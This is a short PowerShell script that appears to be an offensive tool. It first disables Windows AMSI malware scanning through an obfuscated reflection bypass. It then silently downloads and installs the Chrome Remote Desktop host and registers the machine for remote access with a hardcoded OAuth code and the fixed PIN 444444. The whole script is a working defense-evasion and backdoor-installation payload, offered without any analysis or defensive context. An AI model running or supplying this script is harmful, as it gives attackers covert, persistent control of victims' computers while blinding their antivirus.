$a='si';$b='Am';$Ref=[Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils'-f $b,$a)); $z=$Ref.GetField(('am{0}InitFailed'-f$a),'NonPublic,Static');$z.SetValue($null,$true)

$CRDP_CMD = '"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="4/0AZEOvhUi40jTSP_ORUMAGy4DedVGlpfwy3EWWXiQVCU3WVvgr1RAuSXqilJfmBadMlEC_g" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME%'
$CRDP_CMD += " --pin="

$pin = "444444"

$CRDP_CMD += $pin

$PayloadMsiName = 'chromeremotedesktophost.msi'

$Url = "https://dl.google.com/edgedl/chrome-remote-desktop/"


iwr -Uri $Url$PayloadMsiName -OutFile $env:TEMP$PayloadMsiName


powershell -c $env:TEMP$PayloadMsiName
sleep 5
cmd /c $CRDP_CMD